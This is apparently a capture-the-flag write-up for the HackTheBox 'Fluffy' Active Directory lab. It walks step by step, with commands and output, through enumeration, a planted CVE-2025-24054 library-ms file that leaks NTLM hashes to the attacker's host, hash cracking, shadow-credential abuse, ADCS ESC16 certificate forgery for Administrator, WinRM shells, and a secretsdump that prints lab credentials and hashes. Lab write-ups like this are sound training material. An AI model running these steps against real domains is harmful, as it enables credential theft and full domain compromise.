│ Root CAs           │       0 │         │
│ Enterprise CAs     │       0 │         │
│ Cert Templates     │       0 │         │
└────────────────────┴─────────┴─────────┘

┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ bhcli users -d "$(pt get domain)" --description
ADMINISTRATOR@FLUFFY.HTB        Built-in account for administering the computer/domain
CA_SVC@FLUFFY.HTB
GUEST@FLUFFY.HTB        Built-in account for guest access to the computer/domain
J.COFFEY@FLUFFY.HTB
J.FLEISCHMAN@FLUFFY.HTB
KRBTGT@FLUFFY.HTB       Key Distribution Center Service Account
LDAP_SVC@FLUFFY.HTB
NT AUTHORITY@FLUFFY.HTB
P.AGILA@FLUFFY.HTB
WINRM_SVC@FLUFFY.HTB

┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ bhcli audit -d "$(pt get domain)"
FLUFFY.HTB
==========

[*] Interesting privileges for domain users or computers
    0 relations found

[*] Interesting privileges for guests
    0 relations found

[*] Kerberoastable user accounts of high value (enabled, no MSA/gMSA)
    0 accounts found

[*] AS-REP-roastable user accounts (enabled)
    0 accounts found

[*] Accounts trusted for unconstrained delegation (enabled, no DCs)
    0 accounts found
```

#### Ldeep

```bash
mkdir -p ldeep && ldeep ldap -u "$(pt get user)" -p "$(pt get pass)" -d "$(pt get domain)" -s "ldap://$(pt get rhost)" all ldeep/
```


##### Insight

- **Kerberoastable** users
- **ADCS** is enabled

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ find ldeep/*.lst -type f -size +0c -not -path '*_conf.lst' -exec ls -lS {} +
-rw-r--r-- 1 bravosec kali 30504 May 28 02:52 ldeep/_templates.lst
-rw-r--r-- 1 bravosec kali  1097 May 28 02:52 ldeep/_groups.lst
-rw-r--r-- 1 bravosec kali   729 May 28 02:52 ldeep/_pkis.lst
-rw-r--r-- 1 bravosec kali   311 May 28 02:52 ldeep/_domain_policy.lst
-rw-r--r-- 1 bravosec kali   205 May 28 02:52 ldeep/_fsmo.lst
-rw-r--r-- 1 bravosec kali   148 May 28 02:52 ldeep/_ou.lst
-rw-r--r-- 1 bravosec kali   136 May 28 02:52 ldeep/_gpo.lst
-rw-r--r-- 1 bravosec kali    83 May 28 02:52 ldeep/_users_all.lst
-rw-r--r-- 1 bravosec kali    76 May 28 02:52 ldeep/_users_enabled.lst
-rw-r--r-- 1 bravosec kali    76 May 28 02:52 ldeep/_users_nopasswordexpire.lst
-rw-r--r-- 1 bravosec kali    26 May 28 02:52 ldeep/_users_spn.lst
-rw-r--r-- 1 bravosec kali    21 May 28 02:51 ldeep/_delegations_all.lst
-rw-r--r-- 1 bravosec kali    21 May 28 02:51 ldeep/_delegations_unconstrained.lst
-rw-r--r-- 1 bravosec kali    16 May 28 02:51 ldeep/_computers.lst
-rw-r--r-- 1 bravosec kali    11 May 28 02:52 ldeep/_zones.lst
-rw-r--r-- 1 bravosec kali     7 May 28 02:52 ldeep/_users_disabled.lst
-rw-r--r-- 1 bravosec kali     6 May 28 02:52 ldeep/_machines.lst
-rw-r--r-- 1 bravosec kali     6 May 28 02:52 ldeep/_users_passwordnotrequired.lst
-rw-r--r-- 1 bravosec kali     3 May 28 02:52 ldeep/_schema.lst
```


##### Users with interesting attributes

- `Administrator` has a user certificate configured

![](/assets/obsidian/c32f2dc811eb5d94ca03f9a10d2db2e7.png)

- `winrm_svc` user might be abusable

![](/assets/obsidian/e15ba86d651393aa2159b7b9a93ce3e8.png)


##### Group users by group

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ cat ldeep/*_users_all.json | jq 'map(select(.memberOf != null)) | reduce .[] as $item ({}; reduce $item.memberOf[] as $group (.; .[$group] = (.[$group] // []) + [$item.sAMAccountName]))'
{
  "CN=Service Account Managers,CN=Users,DC=fluffy,DC=htb": [
    "j.coffey",
    "p.agila"
  ],
  "CN=Service Accounts,CN=Users,DC=fluffy,DC=htb": [
    "winrm_svc",
    "ldap_svc",
    "ca_svc"
  ],
  "CN=Remote Management Users,CN=Builtin,DC=fluffy,DC=htb": [
    "winrm_svc"
  ],
  "CN=Cert Publishers,CN=Users,DC=fluffy,DC=htb": [
    "ca_svc"
  ],
  "CN=Denied RODC Password Replication Group,CN=Users,DC=fluffy,DC=htb": [
    "krbtgt"
  ],
  "CN=Guests,CN=Builtin,DC=fluffy,DC=htb": [
    "Guest"
  ],
  "CN=Group Policy Creator Owners,CN=Users,DC=fluffy,DC=htb": [
    "Administrator"
  ],
  "CN=Domain Admins,CN=Users,DC=fluffy,DC=htb": [
    "Administrator"
  ],
  "CN=Enterprise Admins,CN=Users,DC=fluffy,DC=htb": [
    "Administrator"
  ],
  "CN=Schema Admins,CN=Users,DC=fluffy,DC=htb": [
    "Administrator"
  ],
  "CN=Administrators,CN=Builtin,DC=fluffy,DC=htb": [
    "Administrator"
  ]
}
```


### User access check


#### AD

- `j.fleischman` has no interesting writable objects

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get pass)" -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=fluffy,DC=htb
permission: WRITE

distinguishedName: CN=Joel Fleischman,CN=Users,DC=fluffy,DC=htb
permission: WRITE
```


#### SMB shares

Spider SMB shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)" -M spider_plus --smb-timeout 10 --log nxc_shares.log -k
SMB         DC01.fluffy.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         DC01.fluffy.htb 445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
SPIDER_PLUS DC01.fluffy.htb 445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS DC01.fluffy.htb 445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS DC01.fluffy.htb 445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS DC01.fluffy.htb 445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS DC01.fluffy.htb 445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS DC01.fluffy.htb 445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS DC01.fluffy.htb 445    DC01             [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         DC01.fluffy.htb 445    DC01             [*] Enumerated shares
SMB         DC01.fluffy.htb 445    DC01             Share           Permissions     Remark
SMB         DC01.fluffy.htb 445    DC01             -----           -----------     ------
SMB         DC01.fluffy.htb 445    DC01             ADMIN$                          Remote Admin
SMB         DC01.fluffy.htb 445    DC01             C$                              Default share
SMB         DC01.fluffy.htb 445    DC01             IPC$            READ            Remote IPC
SMB         DC01.fluffy.htb 445    DC01             IT              READ,WRITE
SMB         DC01.fluffy.htb 445    DC01             NETLOGON        READ            Logon server share
SMB         DC01.fluffy.htb 445    DC01             SYSVOL          READ            Logon server share
SPIDER_PLUS DC01.fluffy.htb 445    DC01             [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/DC01.fluffy.htb.json".
SPIDER_PLUS DC01.fluffy.htb 445    DC01             [*] SMB Shares:           6 (ADMIN$, C$, IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS DC01.fluffy.htb 445    DC01             [*] SMB Readable Shares:  4 (IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS DC01.fluffy.htb 445    DC01             [*] SMB Writable Shares:  1 (IT)
SPIDER_PLUS DC01.fluffy.htb 445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS DC01.fluffy.htb 445    DC01             [*] Total folders found:  27
SPIDER_PLUS DC01.fluffy.htb 445    DC01             [*] Total files found:    26
SPIDER_PLUS DC01.fluffy.htb 445    DC01             [*] File size average:    545.57 KB
SPIDER_PLUS DC01.fluffy.htb 445    DC01             [*] File size min:        23 B
SPIDER_PLUS DC01.fluffy.htb 445    DC01             [*] File size max:        3.15 MB
```

- There're some interesting files in `IT` share

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ cat ~/".nxc/modules/nxc_spider_plus/$(pt get rhost).json" | jq -r 'to_entries[] | .key as $top_level | .value | to_entries[]? | select(.value | type == "object") | {file_path: ($top_level + "/" + .key), atime: (.value.atime_epoch // "N/A"), size: (.value.size // "N/A")}' | jq -s -r 'sort_by(.atime)[] | [.file_path, .atime, .size] | @tsv' | column -t -s $'\t'
IT/KeePass-2.58/XSL/KDBX_Tabular_HTML.xsl                                                                           2020-01-13 10:58:47  3.03 KB
IT/KeePass-2.58/XSL/KDBX_DetailsLight_HTML.xsl                                                                      2020-01-13 10:58:49  3.03 KB
IT/KeePass-2.58/XSL/KDBX_PasswordsOnly_TXT.xsl                                                                      2020-01-13 10:58:49  919 B
IT/KeePass-2.58/XSL/KDBX_DetailsFull_HTML.xsl                                                                       2020-01-13 10:58:51  3.47 KB
IT/Everything-1.4.1.1026.x64/Everything.lng                                                                         2024-07-26 04:19:03  935.88 KB
IT/Everything-1.4.1.1026.x64/everything.exe                                                                         2024-08-02 09:43:53  2.16 MB
IT/KeePass-2.58/License.txt                                                                                         2025-01-02 06:32:37  18.27 KB
IT/KeePass-2.58/XSL/KDBX_Common.xsl                                                                                 2025-01-02 06:39:29  2.67 KB
IT/KeePass-2.58/KeePassLibC32.dll                                                                                   2025-03-05 01:18:41  594.86 KB
IT/KeePass-2.58/KeePassLibC64.dll                                                                                   2025-03-05 01:20:41  767.36 KB
IT/KeePass-2.58/KeePass.exe                                                                                         2025-03-05 01:24:29  3.15 MB
IT/KeePass-2.58/KeePass.XmlSerializers.dll                                                                          2025-03-05 01:25:01  452.41 KB
IT/KeePass-2.58/ShInstUtil.exe                                                                                      2025-03-05 01:26:11  94.85 KB
IT/KeePass-2.58/KeePass.chm                                                                                         2025-03-05 01:26:41  750.47 KB
IT/KeePass-2.58/KeePass.exe.config                                                                                  2025-03-05 01:27:03  763 B
SYSVOL/fluffy.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf  2025-04-18 23:27:17  1.5 KB
SYSVOL/fluffy.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf  2025-04-19 18:40:29  6.78 KB
IT/Upgrade_Notice.pdf                                                                                               2025-05-17 22:31:07  165.98 KB
SYSVOL/fluffy.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI                                           2025-05-20 05:43:31  23 B
SYSVOL/fluffy.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Registry.pol                              2025-05-20 05:43:31  1.96 KB
SYSVOL/fluffy.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/comment.cmtx                              2025-05-20 05:43:31  552 B
SYSVOL/fluffy.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI                                           2025-05-20 06:02:17  23 B
SYSVOL/fluffy.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol                              2025-05-20 06:02:17  4.71 KB
SYSVOL/fluffy.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/comment.cmtx                              2025-05-20 06:02:17  552 B
IT/Everything-1.4.1.1026.x64.zip                                                                                    2025-05-21 23:12:12  1.74 MB
IT/KeePass-2.58.zip                                                                                                 2025-05-21 23:12:12  3.08 MB
```


### Client side attack - NTLM Hash Disclosure Spoofing (CVE-2025-24054)

> Since we have write access to `IT` share, lets try out the [NTLM Hash Disclosure Exploit (CVE-2025-24054)](https://www.rapid7.com/db/vulnerabilities/microsoft-windows-cve-2025-24054/) in the wild that I've recently seen from [cymulate](https://cymulate.com/)'s threat feed
{: .prompt-tip }

> POC - https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC

Start responder in analyzer mode

```bash
sudo responder -A -I tun0 -v
```

Generate a malicious windows library file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ sed "s/10.10.14.7/$(pt get lhost)/g" /opt/sectools/client-side-attack/Windows/CVE-2025-24054_CVE-2025-24071-PoC/exploit.py > exploit/CVE-2025-24054.py; python exploit/CVE-2025-24054.py
[+] File xd.library-ms successfully generated, pointing to \\10.10.14.7\share
```

Upload the malicious windows library file to `IT` share

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ smbclient -U "$(pt get domain)\\$(pt get user)%$(pt get pass)" "//$(pt get rhost)/IT" -c 'put xd.library-ms'
putting file xd.library-ms as \xd.library-ms (0.6 kb/s) (average 0.6 kb/s)
```

We got some authentication callbacks from `p.agila` immediately

![](/assets/obsidian/867c9a5a77c9692eb4d721e9b7062401.png)

Extract unique hashes from logs

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ cat /usr/share/responder/logs/*-$(pt get ip).txt | awk -F: '!seen[$1 FS $2 FS $3]++' > loot/responder.hash
```

Cracked the hash

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ hashcat loot/responder.hash /opt/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
[...]

┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ hashcat loot/responder.hash /opt/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

P.AGILA::FLUFFY:3568ca142ce5bf0c:af1b2d374d4ba3e048b1d34c81c1dc29:010100000000000000d95b4e7fcfdb01cfcc6259f072aa3e0000000002000800420049004400410001001e00570049004e002d0041004d0035004800350030004900460047003400500004003400570049004e002d0041004d003500480035003000490046004700340050002e0042004900440041002e004c004f00430041004c000300140042004900440041002e004c004f00430041004c000500140042004900440041002e004c004f00430041004c000700080000d95b4e7fcfdb0106000400020000000800300030000000000000000100000000200000d941d6f45f102be4930e58d5b27e9cf097e0c18b1f6a2bb09259b741e660510c0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0037000000000000000000:prometheusx-303
```

The credential is valid

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ nxc smb $(pt get rhost) -k -u 'P.AGILA' -p 'prometheusx-303'
SMB         DC01.fluffy.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         DC01.fluffy.htb 445    DC01             [+] fluffy.htb\P.AGILA:prometheusx-303
```

Add the cred to record

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ echo -n "Username: "; read user; echo -n "Password: "; stty -echo; read pass; stty echo; echo; pt set user "$user"; pt set pass "$pass"; echo "${user}:${pass}" | anew -q creds.lst
Username: P.AGILA
Password:
```


## Shell as winrm_svc


### DACL Abuse - Write access to service accounts

- `p.agila` is a group member of `Service Account Managers`, the group has write access to `Service Accounts`

![](/assets/obsidian/6c36d663a2f9c5f6e5e704e5dd130d6e.png)

- `Service Accounts` group has write access to interesting **service accounts** such as `ca_svc` and `winrm_svc`
-  Since **ADCS** is enabled in this AD, we can create shadow credentials
- `ca_svc` could potentially manage and abuse certificates

![](/assets/obsidian/32f8bbd4b40201f2fda9d8e6cb519c7a.png)

- By running `Shortest Path From Owned Objects` query, we know that `winrm_svc` can get a shell, and `ca_svc` is in `Cert Publishers` group

![](/assets/obsidian/8c4938b24a9d3621d4baa2f22cec689b.png)

- `Cert Publishers` can edit `userCertificate` from user objects

![](/assets/obsidian/a5dcf3d80912f2980f2d3474dbcd7218.png)

Lets add `p.agila` to `Service Accounts` group

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get pass)" -k add groupMember 'Service Accounts' 'P.AGILA'
[+] P.AGILA added to Service Accounts
```


### (Failed) Targeted kerberoasting

Always try to **kerberoast** users when possible, then spray passwords if cracked

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ python /opt/sectools/ad/targetedKerberoast/targetedKerberoast.py -o targetedkerberoast.txt -v -d "$(pt get domain)" -u "$(pt get user)" -p "$(pt get pass)"
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Writing hash to file for (ca_svc)
[+] Writing hash to file for (ldap_svc)
[+] Writing hash to file for (winrm_svc)
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ hashcat targetedkerberoast.txt /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat (v6.2.6) starting in autodetect mode
[...]

┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ hashcat targetedkerberoast.txt /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.
```


### DACL Abuse - Create shadow credentials

Generate and add a `KeyCredential` to `msDS-KeyCredentialLink` attribute on `winrm_svc`, then **Pass-The-Cert** to request a TGT

> If you're getting the error below, it means that **ADCS** has not completely setup, wait for about 5 minutes for it be initialized
> ```bash
> [-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
> ```
{: .prompt-danger }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ certipy shadow auto -dc-ip $(pt get ip) -u "$(pt get user)" -p "$(pt get pass)" -account 'winrm_svc'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'ac4a3c08-bf30-ee68-4061-a7c197920180'
[*] Adding Key Credential with device ID 'ac4a3c08-bf30-ee68-4061-a7c197920180' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'ac4a3c08-bf30-ee68-4061-a7c197920180' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```


### 5985 - Winrm

Pass the ticket via **evil-winrm**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ pt set ticket $(realpath `ls -t *.ccache|head -1`)

┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ KRB5CCNAME="$(pt get ticket)" evil-winrm -r $(pt get domain) -i $(pt get dc_fqdn)

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> whoami
fluffy\winrm_svc
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cat ..\Desktop\user.txt
373cf922e6b3dc360564a7fa70871cc1
```


# Root Flag
---

## Shell as administrator


### DACL Abuse - Create shadow credentials

Generate and add a `KeyCredential` to `msDS-KeyCredentialLink` attribute on `ca_svc`, then **Pass-The-Cert** to request a TGT

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ certipy shadow auto -dc-ip $(pt get ip) -u "$(pt get user)" -p "$(pt get pass)" -account 'ca_svc'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'a8a6b5d2-56f5-8229-4429-48001968d93c'
[*] Adding Key Credential with device ID 'a8a6b5d2-56f5-8229-4429-48001968d93c' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'a8a6b5d2-56f5-8229-4429-48001968d93c' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```


### ADCS - ESC16 : Security Extension is disabled

- `fluffy-DC01-CA` is vulnerable to **ESC16** (CA disables SID extension)
- `ca_svc` can enroll any templates

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ pt set ticket $(realpath `ls -t *.ccache|head -1`)

┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ KRB5CCNAME="$(pt get ticket)" certipy find -k -dc-ip $(pt get ip) -target "$(pt get dc_fqdn)" -vulnerable -stdout
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

- Google : `ESC16 abuse`

> WIKI - https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation

![](/assets/obsidian/42fa183426380c5dbffe68168a8dcf90.png)

Read original UPN of the victim account for restoration

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -k ccache="$(pt get ticket)" get object ca_svc --attr userPrincipalName

distinguishedName: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
userPrincipalName: ca_svc@fluffy.htb
```

Manipulate victim account's **UPN** to `Administrator`'s **sAMAccountName**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ KRB5CCNAME="$(pt get ticket)" certipy account -k -dc-ip $(pt get ip) -target "$(pt get dc_fqdn)" -user 'ca_svc' -upn 'administrator' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

Request a certificate as the "victim" user from any **suitable client authentication template** (e.g., "User") on the `ESC16-vulnerable` CA, it will omit the SID security extension from the issued certificate

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ KRB5CCNAME="$(pt get ticket)" certipy req -k -dc-ip $(pt get ip) -target "$(pt get dc_fqdn)" -ca 'fluffy-DC01-CA' -template 'User'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 17
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Restore victim account's original UPN

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ KRB5CCNAME="$(pt get ticket)" certipy account -k -dc-ip $(pt get ip) -target "$(pt get dc_fqdn)" -user 'ca_svc' -upn 'ca_svc@fluffy.htb' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

Pass-The-Cert to request a TGT

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ KRB5CCNAME="$(pt get ticket)" certipy auth -k -dc-ip $(pt get ip) -domain "$(pt get domain)" -pfx 'administrator.pfx'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving Kirbi file to 'administrator.kirbi'
[*] Wrote Kirbi file to 'administrator.kirbi'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

Convert kirbi (Windows format) to ccache (Linux format)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ ticketConverter.py administrator.kirbi administrator.ccache
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done
```

Pass the ticket via **evil-winrm**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ pt set ticket $(realpath `ls -t *.ccache|head -1`)

┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ KRB5CCNAME="$(pt get ticket)" evil-winrm -r $(pt get domain) -i $(pt get dc_fqdn)

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
fluffy\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
a50ef4494e1471293c947c17afb03835
```


# Additional
---

## Post exploitation


### Secrets

```bash
┌──(bravosec㉿fsociety)-[~/htb/Fluffy]
└─$ KRB5CCNAME="$(pt get ticket)" secretsdump.py -k $(pt get dc_fqdn) -outputfile secretsdump -use-vss
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xffa5608d6bd2811aaabfd47fbc3d1c37
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
FLUFFY\DC01$:plain_password_hex:c051a2b56dd8422b09fcc441e1bfaf0a5f0fe659a1634184e7dd6849da03747cad2050bd71e55da3e979245cb872106b52367ac876380294db669d308655c9f8f72b71ea10b4cc90199e1a059645dad4e77b3b982de60b7a59af8d4261b0077be1890caf3aa7e6290dcbc0c443f81bc6124cdef4e26472b3a5c8bcd8fc666b876709496e61a026559328d19db45819e69695bbafda526692513d2457e98de68b9473b08ed96e1d50b06dc53c6e58a595feebd6568a2a75811a5456336f40ede98c2996a0360a618d492e112a905235641126ad3234d68a920c0cd9439b4bd7203d28a1ad4d2ebdbe484d47836735b4cb
FLUFFY\DC01$:aad3b435b51404eeaad3b435b51404ee:7a9950c26fe9c3cbfe5b9ceaa21c9bfd:::
[*] DefaultPassword
p.agila:prometheusx-303
[*] DPAPI_SYSTEM
dpapi_machinekey:0x50f64bc1be95364da6cc33deca194d9b827c4846
